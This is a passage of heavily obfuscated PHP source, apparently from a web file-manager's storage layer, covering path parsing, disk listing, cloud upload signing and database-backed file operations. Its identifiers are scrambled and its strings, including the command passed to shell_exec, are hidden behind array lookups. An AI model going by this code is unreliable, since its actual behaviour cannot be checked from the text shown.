$ıÿÃ¿Ïœ =& $_SERVER[ëæªã÷]; $Ùﬂê˜å± = str_replace(array($ıÿÃ¿Ïœ[1054], $ıÿÃ¿Ïœ[65]), $ıÿÃ¿Ïœ[53], $Ùﬂê˜å±); $Ùﬂê˜å± = str_replace($ıÿÃ¿Ïœ[108], $ıÿÃ¿Ïœ[8], $Ùﬂê˜å±); $öïÌ≠´¬ = $ıÿÃ¿Ïœ[1241]; if (substr($Ùﬂê˜å±, 0, 3) == $ıÿÃ¿Ïœ[1242]) { $Ùﬂê˜å± = substr($Ùﬂê˜å±, 3); } while (strstr($Ùﬂê˜å±, $öïÌ≠´¬)) { $Ùﬂê˜å± = str_replace($öïÌ≠´¬, $ıÿÃ¿Ïœ[8], $Ùﬂê˜å±); } $Ùﬂê˜å± = preg_replace($ıÿÃ¿Ïœ[1243], $ıÿÃ¿Ïœ[8], $Ùﬂê˜å±); if ($Ùﬂê˜å± == $ıÿÃ¿Ïœ[8]) { return $ıÿÃ¿Ïœ[8]; } $Ùﬂê˜å± = rtrim($Ùﬂê˜å±, $ıÿÃ¿Ïœ[8]); return $Ùﬂê˜å±; } public static function sourceID($õß‰ºÙé) { $ÄÊ≠ÛÎî =& $_SERVER[ëæªã÷]; $¸ƒΩﬂ€’ = self::parse($õß‰ºÙé); if ($¸ƒΩﬂ€’[$ÄÊ≠ÛÎî[33]] !== self::KOD_SOURCE) { show_json(LNG($ÄÊ≠ÛÎî[1244]), !1); } return $¸ƒΩﬂ€’[$ÄÊ≠ÛÎî[401]]; } public static function make($≥ÿÊ„Ó‚) { if (!$≥ÿÊ„Ó‚) { return !1; } return self::makePath(self::KOD_SOURCE, intval($≥ÿÊ„Ó‚)); } public static function makeShare($É≥Âπ®⁄, $ú≥Å˝πï) { return self::makePath(self::KOD_SHARE_ITEM, $É≥Âπ®⁄, $ú≥Å˝πï); } public static function makeFileTypePath($“óÁ©ÛÏ) { return self::makePath(self::KOD_USER_FILE_TYPE, $“óÁ©ÛÏ); } public static function makeFileTagPath($˛„ç€®µ) { return self::makePath(self::KOD_USER_FILE_TAG, $˛„ç€®µ); } public static function makePath($‡¢∂ÛÅ”, $ÿ„ƒñÖÊ = '', $∂•È”ù˛ = '') { $¸†ø‰„  =& $_SERVER[ëæªã÷]; $ÇË·¡åñ = substr($‡¢∂ÛÅ”, 1, -1); $∏Æ—†Ãﬂ = $¸†ø‰„ [1245] . $ÇË·¡åñ . $¸†ø‰„ [1246] . $ÿ„ƒñÖÊ . $¸†ø‰„ [1247]; $∏Æ—†Ãﬂ = $∂•È”ù˛ ? $∏Æ—†Ãﬂ . $∂•È”ù˛ . $¸†ø‰„ [8] : $∏Æ—†Ãﬂ; return $∏Æ—†Ãﬂ; } public static function hashPath($∆ˆŒ‘ÔÓ, $áõ≈ÃÃ√ = true) { $ÇÀ¨¶Œé =& $_SERVER[ëæªã÷]; $íå¥ı‘’ = is_array($∆ˆŒ‘ÔÓ) ? $∆ˆŒ‘ÔÓ : IO::info($∆ˆŒ‘ÔÓ); $‚˛øÕ’ﬁ = _get($íå¥ı‘’, $ÇÀ¨¶Œé[1248], $ÇÀ¨¶Œé[12]); if (!$‚˛øÕ’ﬁ && isset($íå¥ı‘’[$ÇÀ¨¶Œé[403]])) { $íå¥ı‘’ = IO::info(KodIO::make($íå¥ı‘’[$ÇÀ¨¶Œé[403]])); $‚˛øÕ’ﬁ = _get($íå¥ı‘’, $ÇÀ¨¶Œé[1248], $ÇÀ¨¶Œé[12]); } if (!$‚˛øÕ’ﬁ && $áõ≈ÃÃ√) { $¶øºÅÛÈ = KodIO::parse($íå¥ı‘’[$ÇÀ¨¶Œé[88]]); if (!$¶øºÅÛÈ[$ÇÀ¨¶Œé[33]]) { $‚˛øÕ’ﬁ = IO::hashSimple($íå¥ı‘’[$ÇÀ¨¶Œé[88]]); } } if (!$‚˛øÕ’ﬁ) { $‚˛øÕ’ﬁ = md5($íå¥ı‘’[$ÇÀ¨¶Œé[88]] . $íå¥ı‘’[$ÇÀ¨¶Œé[90]] . $íå¥ı‘’[$ÇÀ¨¶Œé[96]]); } return $‚˛øÕ’ﬁ; } public static function initSystemPath() { $ÛÛ†π∫ø =& $_SERVER[ëæªã÷]; if (defined($ÛÛ†π∫ø[1249])) { return; } define($ÛÛ†π∫ø[1249], self::systemPath($ÛÛ†π∫ø[1250])); define($ÛÛ†π∫ø[1251], self::systemPath($ÛÛ†π∫ø[1252])); define($ÛÛ†π∫ø[1253], self::systemPath($ÛÛ†π∫ø[1254])); define($ÛÛ†π∫ø[1255], self::systemPath($ÛÛ†π∫ø[1256])); IOHistory::bindEvent(); } public static function systemPath($¢…ã⁄ë–) { $±ûÍÌ’≈ =& $_SERVER[ëæªã÷]; $ÈÂË¨Äç = $±ûÍÌ’≈[1257] . ucfirst($¢…ã⁄ë–); $ãæÙÊéç = Model($±ûÍÌ’≈[750])->get($ÈÂË¨Äç); if ($ãæÙÊéç) { return $ãæÙÊéç; } if ($¢…ã⁄ë– == $±ûÍÌ’≈[1250]) { $ãæÙÊéç = self::make(Model($±ûÍÌ’≈[805])->systemRootPathAdd($±ûÍÌ’≈[537])); } else { $ãæÙÊéç = self::systemPath($±ûÍÌ’≈[1250]); $Î˛©ˆÁ = self::sourceID($ãæÙÊéç); $ãæÙÊéç = self::make(Model($±ûÍÌ’≈[805])->mkdir($Î˛©ˆÁ, $¢…ã⁄ë–)); } Model($±ûÍÌ’≈[750])->set($ÈÂË¨Äç, $ãæÙÊéç); return $ãæÙÊéç; } public static function systemFolder($ª’˝âõÁ) { $ñæ¢ø‰ä = IO_PATH_SYSTEM_SOURCE . $ª’˝âõÁ; $ˆâ´¢—Ü = Cache::get($ñæ¢ø‰ä); if (!$ˆâ´¢—Ü) { $…òñå˘ù = IO::infoFull($ñæ¢ø‰ä); if (!$…òñå˘ù) { $ˆâ´¢—Ü = IO::mkdir($ñæ¢ø‰ä, REPEAT_SKIP); } else { $ˆâ´¢—Ü = $…òñå˘ù[$_SERVER[ëæªã÷][88]]; } Cache::set($ñæ¢ø‰ä, $ˆâ´¢—Ü, 3600 * 10); } return $ˆâ´¢—Ü; } public static function defaultDriver() { return Model($_SERVER[ëæªã÷][747])->defaultDriver(); } public static function defaultIO() { $ä∫û∂ªà =& $_SERVER[ëæªã÷]; $å¥¯çœò = self::defaultDriver(); return $ä∫û∂ªà[1258] . $å¥¯çœò[$ä∫û∂ªà[401]] . $ä∫û∂ªà[1247]; } public static function defaultDriverInit() { static $ÈíÓƒ Ú = false; if ($ÈíÓƒ Ú) { return $ÈíÓƒ Ú; } $ÈíÓƒ Ú = IO::init(self::defaultIO()); return $ÈíÓƒ Ú; } public static function fileTypeList() { $À°ñøßê =& $_SERVER[ëæªã÷]; $ï≤ø˚¸µ = $GLOBALS[$À°ñøßê[6]][$À°ñøßê[1259]]; foreach ($ï≤ø˚¸µ as $⁄¿è˙√Ω => $âôÅå”˙) { $êüÜ¯‡Ë = $À°ñøßê[1260] . $⁄¿è˙√Ω; $ÉñáÔÔ∂ = LNG($êüÜ¯‡Ë); if ($êüÜ¯‡Ë != $ÉñáÔÔ∂) { $ï≤ø˚¸µ[$⁄¿è˙√Ω][$À°ñøßê[32]] = $ÉñáÔÔ∂; } } return $ï≤ø˚¸µ; } public static function diskList($Ïº¥®ØÚ = true) { $ÑØ»ÍÏé = $_SERVER[ëæªã÷][1261]; if ($Ïº¥®ØÚ) { $€§¬€Øá = Cache::get($ÑØ»ÍÏé); if (is_array($€§¬€Øá)) { return $€§¬€Øá; } } $€§¬€Øá = self::diskListGet(); Cache::set($ÑØ»ÍÏé, $€§¬€Øá, 60); return $€§¬€Øá; } public static function diskListGet() { $‚’§˜≤í =& $_SERVER[ëæªã÷]; $˝èéÖúó = array(); if ($GLOBALS[$‚’§˜≤í[6]][$‚’§˜≤í[1262]] == $‚’§˜≤í[1263]) { $ï“ìﬁÀ∆ = $‚’§˜≤í[1264]; for ($óåû˛†∏ = 0; $óåû˛†∏ < strlen($ï“ìﬁÀ∆); $óåû˛†∏++) { $íπÿî∏∂ = $ï“ìﬁÀ∆[$óåû˛†∏] . $‚’§˜≤í[1265]; if (file_exists($íπÿî∏∂)) { $˝èéÖúó[] = $íπÿî∏∂; } } return $˝èéÖúó; } if (!function_exists($‚’§˜≤í[109])) { $˝èéÖúó[] = $‚’§˜≤í[815]; return $˝èéÖúó; } $úËå·Ω• = explode($‚’§˜≤í[65], shell_exec($‚’§˜≤í[1266])); array_shift($úËå·Ω•); array_pop($úËå·Ω•); $Ïìﬁ∫…¬ = array($‚’§˜≤í[1267], $‚’§˜≤í[1268], $‚’§˜≤í[1269], $‚’§˜≤í[1270], $‚’§˜≤í[1271], $‚’§˜≤í[1272], $‚’§˜≤í[1273], $‚’§˜≤í[1274]); foreach ($úËå·Ω• as $¿‚•˝“Ú) { $”·ŒÊÚ÷ = preg_split($‚’§˜≤í[1275], $¿‚•˝“Ú); $íπÿî∏∂ = $”·ŒÊÚ÷[count($”·ŒÊÚ÷) - 1]; if (!strstr($”·ŒÊÚ÷[0], $‚’§˜≤í[1276]) || !$íπÿî∏∂) { continue; } $Ì‰È•»æ = rtrim($íπÿî∏∂, $‚’§˜≤í[8]) . $‚’§˜≤í[8]; if (in_array($Ì‰È•»æ, $Ïìﬁ∫…¬)) { continue; } $˝èéÖúó[] = $Ì‰È•»æ; } return $˝èéÖúó; } public static function isSameDisk($ˆúª∫ˆ¨, $¥ƒÀ’≤ô) { $ùÙÓ„Î˜ =& $_SERVER[ëæªã÷]; if ($GLOBALS[$ùÙÓ„Î˜[6]][$ùÙÓ„Î˜[1262]] == $ùÙÓ„Î˜[1263]) { return strtolower(substr($ˆúª∫ˆ¨, 0, 1)) == strtolower(substr($¥ƒÀ’≤ô, 0, 1)); } $π™∆æ¸– = self::diskList(); $›ù¿≤ î = !1; $‚¢∞√†ö = !1; sort($π™∆æ¸–); $π™∆æ¸– = array_reverse($π™∆æ¸–); $ˆúª∫ˆ¨ = rtrim($ˆúª∫ˆ¨, $ùÙÓ„Î˜[8]) . $ùÙÓ„Î˜[8]; $¥ƒÀ’≤ô = rtrim($¥ƒÀ’≤ô, $ùÙÓ„Î˜[8]) . $ùÙÓ„Î˜[8]; foreach ($π™∆æ¸– as $„éŸı’ß) { $’ÅóÎñŸ = strlen($„éŸı’ß); if (!$›ù¿≤ î && substr($ˆúª∫ˆ¨, 0, $’ÅóÎñŸ) == $„éŸı’ß) { $›ù¿≤ î = $„éŸı’ß; } if (!$‚¢∞√†ö && substr($¥ƒÀ’≤ô, 0, $’ÅóÎñŸ) == $„éŸı’ß) { $‚¢∞√†ö = $„éŸı’ß; } if ($›ù¿≤ î && $‚¢∞√†ö) { break; } } return $›ù¿≤ î === $‚¢∞√†ö; } public static function transferType($â∞öÀœ‡, $ö“ô›©á) { $ØüÅé“˝ =& $_SERVER[ëæªã÷]; $«“ŸŒø˛ = self::driverType($â∞öÀœ‡); $ù‘«À£⁄ = self::driverType($ö“ô›©á); if ($«“ŸŒø˛[$ØüÅé“˝[33]] == $ù‘«À£⁄[$ØüÅé“˝[33]] && $«“ŸŒø˛[$ØüÅé“˝[1277]] == $ù‘«À£⁄[$ØüÅé“˝[1277]]) { return $ØüÅé“˝[1278]; } if ($«“ŸŒø˛[$ØüÅé“˝[33]] == $ØüÅé“˝[844] && $ù‘«À£⁄[$ØüÅé“˝[33]] == $ØüÅé“˝[117]) { return $ØüÅé“˝[1173]; } if ($«“ŸŒø˛[$ØüÅé“˝[33]] == $ØüÅé“˝[117] && $ù‘«À£⁄[$ØüÅé“˝[33]] == $ØüÅé“˝[844]) { return $ØüÅé“˝[118]; } return $ØüÅé“˝[1279]; } public static function driverType($—î‹˙∆ﬁ) { $÷Ñê‰ ˙ =& $_SERVER[ëæªã÷]; $—…ÛâÏª = str_replace($÷Ñê‰ ˙[1280], $÷Ñê‰ ˙[12], strtolower($—î‹˙∆ﬁ->getType())); if ($—…ÛâÏª == $÷Ñê‰ ˙[738] || $—…ÛâÏª == $÷Ñê‰ ˙[1281] || $—…ÛâÏª == $÷Ñê‰ ˙[1282]) { $—î‹˙∆ﬁ = self::defaultDriverInit(); } else { if ($—…ÛâÏª == $÷Ñê‰ ˙[1180] || $—…ÛâÏª == $÷Ñê‰ ˙[1283]) { $—î‹˙∆ﬁ = IO::init($—î‹˙∆ﬁ->pathParse[$÷Ñê‰ ˙[1127]]); } } $£≈ıΩªÇ = $—î‹˙∆ﬁ->path; $—…ÛâÏª = str_replace($÷Ñê‰ ˙[1280], $÷Ñê‰ ˙[12], strtolower($—î‹˙∆ﬁ->getType())); if ($—…ÛâÏª == $÷Ñê‰ ˙[117]) { return array($÷Ñê‰ ˙[33] => $÷Ñê‰ ˙[117], $÷Ñê‰ ˙[1277] => $÷Ñê‰ ˙[12], $÷Ñê‰ ˙[88] => $£≈ıΩªÇ); } return array($÷Ñê‰ ˙[33] => $÷Ñê‰ ˙[844], $÷Ñê‰ ˙[1277] => $—î‹˙∆ﬁ->pathDriver, $÷Ñê‰ ˙[88] => $£≈ıΩªÇ); } public static function pathDriverType($—ÍÁÇ®ﬂ) { return $—ÍÁÇ®ﬂ ? self::driverType(IO::init($—ÍÁÇ®ﬂ)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($í…Ö‡è·) { parent::__construct($í…Ö‡è·); $this->signatureVersion($_SERVER[ëæªã÷][221]); } public function uploadFormData($ÿ˚™Ÿ“¢, $ïŒ¶≤„Æ = 3600) { $ÜÓÊÈ¬å =& $_SERVER[ëæªã÷]; $¬–£‰Èñ = $ÜÓÊÈ¬å[201]; $¸ß⁄‹ßÂ = $ÜÓÊÈ¬å[236]; $Ûû˜øŸ« = $ÜÓÊÈ¬å[1284]; $Äùù¸∞¬ = gmdate($ÜÓÊÈ¬å[1285], time() + $ïŒ¶≤„Æ); $øºí«˙‘ = (string) time() . $ÜÓÊÈ¬å[81] . (string) (time() + $ïŒ¶≤„Æ); $ÖÍÑπ¬ø = array($ÜÓÊÈ¬å[1286] => $Äùù¸∞¬, $ÜÓÊÈ¬å[1287] => array(array($ÜÓÊÈ¬å[1288] => $¬–£‰Èñ), array($ÜÓÊÈ¬å[1289] => $this->bucket), array($ÜÓÊÈ¬å[1290], $ÜÓÊÈ¬å[1291], $ÜÓÊÈ¬å[12]), array($ÜÓÊÈ¬å[1292] => $Ûû˜øŸ«), array($ÜÓÊÈ¬å[1293] => $¸ß⁄‹ßÂ), array($ÜÓÊÈ¬å[1294] => $this->accessKey), array($ÜÓÊÈ¬å[1295] => $øºí«˙‘))); $ÖÍÑπ¬ø = json_encode($ÖÍÑπ¬ø); $Û™‡™…Ô = hash_hmac($ÜÓÊÈ¬å[236], $øºí«˙‘, $this->secret); $ΩÄî˙á§ = sha1($ÖÍÑπ¬ø); $éÆàµÂ‘ = hash_hmac($ÜÓÊÈ¬å[236], $ΩÄî˙á§, $Û™‡™…Ô); $ò®âòìú = array($ÜÓÊÈ¬å[1288] => $¬–£‰Èñ, $ÜÓÊÈ¬å[1292] => $Ûû˜øŸ«, $ÜÓÊÈ¬å[1296] => base64_encode($ÖÍÑπ¬ø), $ÜÓÊÈ¬å[1293] => $¸ß⁄‹ßÂ, $ÜÓÊÈ¬å[1294] => $this->accessKey, $ÜÓÊÈ¬å[1297] => $øºí«˙‘, $ÜÓÊÈ¬å[1298] => $éÆàµÂ‘, $ÜÓÊÈ¬å[184] => $this->getHost()); return $ò®âòìú; } public function fileOutLink($ÿÑ·Åµº) { $íÓ—¡⁄“ =& $_SERVER[ëæªã÷]; if (substr($ÿÑ·Åµº, 0, 7) == $íÓ—¡⁄“[1299]) { $ÿÑ·Åµº = $íÓ—¡⁄“[1300] . substr($ÿÑ·Åµº, 7); } header($íÓ—¡⁄“[168] . $ÿÑ·Åµº); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($÷µ‰ì ) { $this->pathParse = $÷µ‰ì ; $this->model = Model($_SERVER[ëæªã÷][1301]); } public function getPath($ë•¥ç´æ) { return trim($ë•¥ç´æ, $_SERVER[ëæªã÷][8]); } public function pathFather($„˝µ¬’ê) { $Ì£∏˛⁄å = $this->parse($„˝µ¬’ê); $Ì£∏˛⁄å = $this->infoSimple($„˝µ¬’ê); return $Ì£∏˛⁄å ? $Ì£∏˛⁄å[$_SERVER[ëæªã÷][498]] : !1; } public function pathThis($û˜åô¬Æ) { $ö√∞ºŸ≈ = $this->infoSimple($û˜åô¬Æ); return $ö√∞ºŸ≈ ? $ö√∞ºŸ≈[$_SERVER[ëæªã÷][32]] : !1; } public function getPathOuter($ñ˝§∑ø™) { if (!$ñ˝§∑ø™) { return $ñ˝§∑ø™; } $Âê‹Õ¶Î = $this->parse($ñ˝§∑ø™); return KodIO::make($Âê‹Õ¶Î[$_SERVER[ëæªã÷][401]]); } public function copyFolderFromIO($¯Â≠∑√ª, $Ò˘õæ˛Ä, $à´ﬂå‡ù, $•◊ÆõÅé, $‹µ—œ Î) { $±¨òπ‡› = $this->model->copyFolderFromIO($¯Â≠∑√ª, $Ò˘õæ˛Ä, $à´ﬂå‡ù, $•◊ÆõÅé, $‹µ—œ Î); return KodIO::make($±¨òπ‡›); } public function isParentOf($Äú›–äû, $¬Àµ“ Ù) { return $this->model->isParentOf($Äú›–äû, $¬Àµ“ Ù); } public function mkfile($©◊êñêï, $óÆ˙Ûûñ = '', $ëÀ°Ùâæ = REPEAT_RENAME) { $∆ãÙ⁄ç— =& $_SERVER[ëæªã÷]; $≤ù¬çç∆ = $this->parse($©◊êñêï); $©◊êñêï = $≤ù¬çç∆[$∆ãÙ⁄ç—[401]]; for ($¬‹•⁄‚í = 0; $¬‹•⁄‚í < count($≤ù¬çç∆[$∆ãÙ⁄ç—[1302]]); $¬‹•⁄‚í++) { $Ô‰ïø≠⁄ = $≤ù¬çç∆[$∆ãÙ⁄ç—[1302]][$¬‹•⁄‚í]; if ($¬‹•⁄‚í == count($≤ù¬çç∆[$∆ãÙ⁄ç—[1302]]) - 1) { $©◊êñêï = $this->model->mkfile($©◊êñêï, $Ô‰ïø≠⁄, $óÆ˙Ûûñ, $ëÀ°Ùâæ); break; } $©◊êñêï = $this->model->mkdir($©◊êñêï, $Ô‰ïø≠⁄, REPEAT_SKIP); } return $this->getPathOuter($©◊êñêï); } public function mkdir($‘õ˚≤Ÿñ, $ƒé≥Ëöí = REPEAT_SKIP) { $˚Á˛Ôﬂ∂ =& $_SERVER[ëæªã÷]; $É˜∆áà˚ = $this->parse($‘õ˚≤Ÿñ); $‘õ˚≤Ÿñ = $É˜∆áà˚[$˚Á˛Ôﬂ∂[401]]; for ($á√áö√ï = 0; $á√áö√ï < count($É˜∆áà˚[$˚Á˛Ôﬂ∂[1302]]); $á√áö√ï++) { $Ç≥∆⁄¶ô = $É˜∆áà˚[$˚Á˛Ôﬂ∂[1302]][$á√áö√ï]; $‘õ˚≤Ÿñ = $this->model->mkdir($‘õ˚≤Ÿñ, $Ç≥∆⁄¶ô, $ƒé≥Ëöí); } return $this->getPathOuter($‘õ˚≤Ÿñ); } public function copyFile($Í∆ø˛üá, $ÛúŒÉÑ˘, $óÏ˘øØ´ = REPEAT_REPLACE) { $œπ◊ì°™ =& $_SERVER[ëæªã÷]; $…¢‰…ÑŒ = $this->parse($ÛúŒÉÑ˘); $ïÚÏ±œí = $this->model->copy($Í∆ø˛üá, $…¢‰…ÑŒ[$œπ◊ì°™[401]], $óÏ˘øØ´, $…¢‰…ÑŒ[$œπ◊ì°™[88]]); return $ïÚÏ±œí ? $this->getPathOuter($ïÚÏ±œí) : !1; } public function moveFile($˙ª˙ƒãÓ, $ÁÃ◊≈¡˚, $Æ≤∆øÖÅ = REPEAT_REPLACE) { $ÆêÒ∑Ã˜ =& $_SERVER[ëæªã÷]; $≈ïÚõÖç = $this->parse($ÁÃ◊≈¡˚); $…øÄ‡ùŸ = $this->model->move($˙ª˙ƒãÓ, $≈ïÚõÖç[$ÆêÒ∑Ã˜[401]], $Æ≤∆øÖÅ, $≈ïÚõÖç[$ÆêÒ∑Ã˜[88]]); return $…øÄ‡ùŸ ? $this->getPathOuter($…øÄ‡ùŸ) : !1; } public function copy($Ÿóø–∫¬, $ï´Ç√§‘, $¿Ç≠≥ƒ≈ = REPEAT_REPLACE, $‘ªΩò‰˘ = false) { $ö£≠ÓòŸ = $this->parse($ï´Ç√§‘); $Ù†∫Á¥ø = $this->model->copy($Ÿóø–∫¬, $ö£≠ÓòŸ[$_SERVER[ëæªã÷][401]], $¿Ç≠≥ƒ≈, $‘ªΩò‰˘); return $Ù†∫Á¥ø ? $this->getPathOuter($Ù†∫Á¥ø) : !1; } public function moveSameAllow() { } public function move($⁄˙ß¡¢…, $¸‹ÿ¡ ¶, $Ëºπ◊«ô = REPEAT_REPLACE, $†±‚û£å = false) { $¯æé¥òˆ = $this->parse($¸‹ÿ¡ ¶); $æÛ∞ÓÖ´ = $this->model->move($⁄˙ß¡¢…, $¯æé¥òˆ[$_SERVER[ëæªã÷][401]], $Ëºπ◊«ô, $†±‚û£å); return $æÛ∞ÓÖ´ ? $this->getPathOuter($æÛ∞ÓÖ´) : !1; } public function remove($®Œﬁ©¡¿, $£é±ÿ¥˚ = true) { return $this->model->remove($®Œﬁ©¡¿, $£é±ÿ¥˚); } public function rename($√¯¶Á°√, $Ì∆ÖÈ‘˜) { $˛Ø˚ÕÃÚ = $this->model->rename($√¯¶Á°√, $Ì∆ÖÈ‘˜); return $˛Ø˚ÕÃÚ ? $this->getPathOuter($√¯¶Á°√) : $˛Ø˚ÕÃÚ; } public function size($£…ê¿¢ä) { $íﬁ∂ä©Æ = $this->infoSimple($£…ê¿¢ä); return $íﬁ∂ä©Æ ? $íﬁ∂ä©Æ[$_SERVER[ëæªã÷][90]] : 0; } public function infoSimple($≠∏´±‘∫) { return $this->model->sourceInfo($≠∏´±‘∫); } public function info($◊∂Ÿ±À¢) { return $this->infoParse($◊∂Ÿ±À¢); } public function infoAuth($Úò‰»€á) { return $this->infoParse($Úò‰»€á, !1, !0); } public function infoWithChildren($œ≠Ω´ö) { return $this->infoParse($œ≠Ω´ö, !0); } protected function infoParse($È£ƒ∫≠◊, $°´ä”˛ô = false, $ﬁπÃÉè = false) { if (!$°´ä”˛ô) { return $this->model->pathInfo($È£ƒ∫≠◊, $ﬁπÃÉè); } return $this->model->pathInfoMore($È£ƒ∫≠◊); } public function infoFull($íÙêÇìâ) { $§πÀÕúá =& $_SERVER[ëæªã÷]; $î®¡∫¶— = explode($§πÀÕúá[8], $íÙêÇìâ); $¸˝√Í—˚ = implode($§πÀÕúá[8], array_splice($î®¡∫¶—, 1)); return $this->model->pathInfoByPath($î®¡∫¶—[0], $¸˝√Í—˚); } public function hashSimple($∑«ö•€…) { $∏ö›∏õı =& $_SERVER[ëæªã÷]; $«ŸÙÀÙ¢ = $this->infoWithChildren($∑«ö•€…); return $«ŸÙÀÙ¢[$∏ö›∏õı[173]][$∏ö›∏õı[180]]; } public function hashMd5($‡ß‘∂‚˝) { $ÅîíÒüµ =& $_SERVER[ëæªã÷]; $¿ñÚôë˚ = $this->infoWithChildren($‡ß‘∂‚˝); return $¿ñÚôë˚[$ÅîíÒüµ[173]][$ÅîíÒüµ[179]]; } public function exist($œâ®†å∂) { $í—ÈΩÈ˙ =& $_SERVER[ëæªã÷]; $ﬂÌ±üÜ‘ = $this->parse($œâ®†å∂); if (!$ﬂÌ±üÜ‘[$í—ÈΩÈ˙[88]]) { return $this->isFile($œâ®†å∂) || $this->isFolder($œâ®†å∂); } $ÏÆŸë†á = array($í—ÈΩÈ˙[402] => $ﬂÌ±üÜ‘[$í—ÈΩÈ˙[401]], $í—ÈΩÈ˙[32] => $ﬂÌ±üÜ‘[$í—ÈΩÈ˙[88]]); $ÿ∆∂ôõë = $this->model->where($ÏÆŸë†á)->find(); return $ÿ∆∂ôõë ? !0 : !1; } public function isFile($µœ¬ûëÒ) { $Õúç°‘à =& $_SERVER[ëæªã÷]; $ƒúÑÂ∆í = $this->infoSimple($µœ¬ûëÒ); return $ƒúÑÂ∆í && $ƒúÑÂ∆í[$Õúç°‘à[411]] == $Õúç°‘à[99] ? !1 : !0; } public function isFolder($èÌœù€•) { $¡“±˙   =& $_SERVER[ëæªã÷]; $–è„·úæ = $this->infoSimple($èÌœù€•); return $–è„·úæ && $–è„·úæ[$¡“±˙  [411]] == $¡“±˙  [99] ? !0 : !1; } public function listPath($Œõ˝ƒÇÃ, $ù®Ï˛îå = false) { $á˝Êêú” =& $_SERVER[ëæªã÷]; if ($Œõ˝ƒÇÃ == $á˝Êêú”[12]) { return !1; } $™Ú˘öÃÔ = array($á˝Êêú”[402] => $Œõ˝ƒÇÃ); if ($ù®Ï˛îå) { return $this->model->listSource($™Ú˘öÃÔ, -1); } return $this->model->listSource($™Ú˘öÃÔ); } public function has($æΩÖ·„Ö, $ï„†¯¥ú = false, $âΩÌãçÀ = null) { $†˝°ñ¶™ =& $_SERVER[ëæªã÷]; $•óÈ èà = $this->infoWithChildren($æΩÖ·„Ö); if ($ï„†¯¥ú) { return array($†˝°ñ¶™[213] => $•óÈ èà[$†˝°ñ¶™[213]], $†˝°ñ¶™[212] => $•óÈ èà[$†˝°ñ¶™[212]]); } return $âΩÌãçÀ ? $•óÈ èà[$†˝°ñ¶™[213]] : $•óÈ èà[$†˝°ñ¶™[212]]; } public function listAll($ØªòÌä») { $ü¬Ô≥®¶ = IO::info($this->pathParse[$_SERVER[ëæªã÷][88]]); if (!$ü¬Ô≥®¶) { return array(); } return $this->model->listAll($ØªòÌä»); } public function getContent($ˆ§Æπ˜è) { return $this->model->getContent($ˆ§Æπ˜è); } public function setContent($°üá´üó, $—œ∏°∆ = '') { return $this->model->setContent($°üá´üó, $—œ∏°∆); } public function fileSubstr($÷îØ£–Ü, $ÏÈªãÙÇ, $ ˛ã≥†–) { return $this->model->fileSubstr($÷îØ£–Ü, $ÏÈªãÙÇ, $ ˛ã≥†–); } public function download($ÿÄ˝ÿ¨ÿ, $∫å‚˜¶≠ = '') { $é¶›ì∆à = get_path_father($∫å‚˜¶≠); $˙Ëòß≈ = get_path_this($∫å‚˜¶≠); $‘Æ”Æ’ú = $this->model->fileInfoGet($ÿÄ˝ÿ¨ÿ); $€üî˚Œ∆ = IO::copy($‘Æ”Æ’ú[$_SERVER[ëæªã÷][88]], $é¶›ì∆à, !1, $˙Ëòß≈); return $€üî˚Œ∆; } public function setModifyTime($Â‹çﬁ˘Ó, $·êﬁè‰é = '') { $Ìˆ¨éûƒ =& $_SERVER[ëæªã÷]; if (!$Â‹çﬁ˘Ó) { return; } $this->model->where(array($Ìˆ¨éûƒ[418] => $Â‹çﬁ˘Ó))->save(array($Ìˆ¨éûƒ[96] => $·êﬁè‰é)); } public function upload($ÅÚ¿∑∫‰, $ÿÚ˜´≥≠, $ô¡‡⁄èﬂ = false, $¡ó∑´∏ø = REPEAT_REPLACE) { $†∑øÇ˚◊ =& $_SERVER[ëæªã÷]; $Ç’Î¨∂º = $this->parse($ÅÚ¿∑∫‰); $£›¿è• = $this->model->addFile($Ç’Î¨∂º[$†∑øÇ˚◊[401]], $ÿÚ˜´≥≠, $Ç’Î¨∂º[$†∑øÇ˚◊[88]], $ô¡‡⁄èﬂ, $¡ó∑´∏ø); return $this->getPathOuter($£›¿è•); } public function uploadFileByID($‡·å√ãŒ, $î¬÷ó¿≠, $Á÷¡·Ë”) { $Ë≥àëÓ∂ =& $_SERVER[ëæªã÷]; $©ê£ﬁ˛Ø = $this->parse($‡·å√ãŒ); $–ßîÎ…ﬂ = $this->model->addFileByFileID($©ê£ﬁ˛Ø[$Ë≥àëÓ∂[401]], $î¬÷ó¿≠, $©ê£ﬁ˛Ø[$Ë≥àëÓ∂[88]], $Á÷¡·Ë”); return $this->getPathOuter($–ßîÎ…ﬂ); } public function addFileByRemote($ˆÕñÎÕú, $ßü§‘’Ÿ, $◊˝√˛Í≈ = array(), $≥©∫◊∑µ = '', $∞∂ØÃéÙ) { $±õ£ÊË⁄ =& $_SERVER[ëæªã÷]; $Áí«›˙ø = $this->parse($ˆÕñÎÕú); $≥©∫◊∑µ = empty($≥©∫◊∑µ) ? $Áí«›˙ø[$±õ£ÊË⁄[88]] : $≥©∫◊∑µ; $Ò¡ÍÎö” = $this->model->addFileByRemote($Áí«›˙ø[$±õ£ÊË⁄[401]], $ßü§‘’Ÿ, $≥©∫◊∑µ, $◊˝√˛Í≈, $∞∂ØÃéÙ); return $this->getPathOuter($Ò¡ÍÎö”); } public function uploadLink($®ÎÚÍª∞, $ôüî˛ÍØ = 0) { $ Ùêâı‡ =& $_SERVER[ëæªã÷]; $¯Ù‡≥«ı = $this->parse($®ÎÚÍª∞); $Äè…ÔµÆ = _get($GLOBALS[$ Ùêâı‡[7]], $ Ùêâı‡[1303]); $√µÑö‰÷ = _get($GLOBALS[$ Ùêâı‡[7]], $ Ùêâı‡[1304]); $®ÎÚÍª∞ = Model($ Ùêâı‡[603])->createFileName($¯Ù‡≥«ı[$ Ùêâı‡[88]], $Äè…ÔµÆ, $√µÑö‰÷); return IO::uploadLink($®ÎÚÍª∞, $ôüî˛ÍØ); } public function fileNameAuto($ÓﬁÒò‡º, $‡©ä€≥—, $¥∆Ï»√Û = REPEAT_REPLACE, $¡Ëòæ†∆ = false) { return $this->model->fileNameAuto($ÓﬁÒò‡º, $‡©ä€≥—, $¥∆Ï»√Û, $¡Ëòæ†∆); } public function fileNameExist($øƒüòÖº, $ú¡ÇãÂß) { return $this->model->fileNameExist($øƒüòÖº, $ú¡ÇãÂß); } protected function _fileOut($ÎÅ˙◊˜—, $ôﬁ—™ïë = false, $‘ÒË˚ß = false, 